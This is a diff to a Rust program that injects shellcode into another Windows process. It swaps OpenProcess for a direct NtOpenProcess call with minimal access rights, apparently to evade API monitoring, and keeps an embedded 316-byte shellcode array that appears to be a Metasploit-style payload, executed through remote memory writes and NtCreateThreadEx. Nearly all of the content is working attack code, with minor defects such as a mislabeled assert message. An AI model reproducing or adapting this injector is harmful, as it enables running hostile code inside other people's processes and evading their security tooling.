@@ -1,15 +1,45 @@
 use std::{env, ffi::c_void, ptr};
-use windows::Win32::{
-    Foundation::{BOOL, HANDLE, NTSTATUS},
-    System::Threading::{OpenProcess, PROCESS_ALL_ACCESS},
-};
+use windows::Win32::Foundation::NTSTATUS;
+
+type HANDLE = *mut c_void;
+
+#[repr(C)]
+#[allow(non_camel_case_types)]
+#[allow(non_snake_case)]
+pub struct CLIENT_ID {
+    UniqueProcess: *mut c_void,
+    UniqueThread: *mut c_void,
+}
+
+#[repr(C)]
+#[allow(non_camel_case_types)]
+#[allow(non_snake_case)]
+pub struct OBJECT_ATTRIBUTES {
+    Lenght: u32,
+    RootDirectory: HANDLE,
+    ObjectName: *mut c_void,
+    Attributes: u32,
+    SecurityDescriptor: *mut c_void,
+    SecurityQualityOfService: *mut c_void,
+}
 
 const MEM_COMMIT: u32 = 0x1000;
 const MEM_RESERVE: u32 = 0x2000;
 const PAGE_EXECUTE_READWRITE: u32 = 0x40;
+const PROCESS_VM_OPERATION: u32 = 0x0008;
+const PROCESS_VM_WRITE: u32 = 0x0020;
+const PROCESS_CREATE_THREAD: u32 = 0x0002;
+const PROCESS_QUERY_INFORMATION: u32 = 0x0400;
 
 #[link(name = "ntdll")]
 unsafe extern "system" {
+    pub fn NtOpenProcess(
+        ProcessHandle: *mut HANDLE,
+        DesiredAccess: u32,
+        ObjectAttributes: *mut OBJECT_ATTRIBUTES,
+        ClientId: *mut CLIENT_ID,
+    ) -> NTSTATUS;
+
     pub fn NtCreateThreadEx(
         thread_handle: *mut HANDLE,
         desired_access: u32,
@@ -64,8 +94,36 @@ pub fn main() -> windows::core::Result<()> {
                 std::process::exit(1);
             }
         };
-        let h_process = OpenProcess(PROCESS_ALL_ACCESS, BOOL(0), pid)?;
-        assert!(h_process.0 != 0, "OpenProcess failed");
+        let mut h_process: HANDLE = std::ptr::null_mut();
+        let mut object_attributes = OBJECT_ATTRIBUTES {
+            Lenght: size_of::<OBJECT_ATTRIBUTES>() as u32,
+            RootDirectory: std::ptr::null_mut(),
+            ObjectName: std::ptr::null_mut(),
+            Attributes: 0,
+            SecurityDescriptor: std::ptr::null_mut(),
+            SecurityQualityOfService: std::ptr::null_mut(),
+        };
+        let mut client_id = CLIENT_ID {
+            UniqueProcess: pid as usize as *mut c_void,
+            UniqueThread: std::ptr::null_mut(),
+        };
+        let desired_access: u32 = PROCESS_VM_WRITE
+            | PROCESS_CREATE_THREAD
+            | PROCESS_VM_OPERATION
+            | PROCESS_QUERY_INFORMATION;
+        let openprocess_status = NtOpenProcess(
+            &mut h_process as *mut HANDLE,
+            desired_access,
+            &mut object_attributes as *mut OBJECT_ATTRIBUTES,
+            &mut client_id as *mut CLIENT_ID,
+        );
+        assert!(
+            openprocess_status.0 == 0,
+            "NtAllocateVirtualMemory failed with NTSTATUS: 0x{:X}",
+            openprocess_status.0
+        );
+        // let h_process = OpenProcess(PROCESS_ALL_ACCESS, BOOL(0), pid)?;
+        // assert!(h_process.0 != 0, "OpenProcess failed");
 
         let shellcode: [u8; 316] = [
             0xfc, 0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0xe8, 0xcc, 0x00, 0x00, 0x00, 0x41,
@@ -123,7 +181,7 @@ pub fn main() -> windows::core::Result<()> {
             write_status.0
         );
 
-        let mut h_thread: HANDLE = HANDLE(0);
+        let mut h_thread: HANDLE = std::ptr::null_mut();
         let status = NtCreateThreadEx(
             &mut h_thread,
             0x1FFFFF,
